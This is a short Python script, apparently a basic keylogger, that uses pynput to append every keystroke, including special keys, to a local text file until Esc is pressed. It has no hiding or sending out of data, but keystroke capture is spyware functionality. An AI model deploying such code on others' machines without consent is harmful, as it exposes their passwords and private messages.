import pynput
from pynput.keyboard import Key, Listener

# Path to save the log file
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            with open(log_file, "a") as f:
                f.write(' ')
        else:
            with open(log_file, "a") as f:
                f.write(f'[{key}]')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
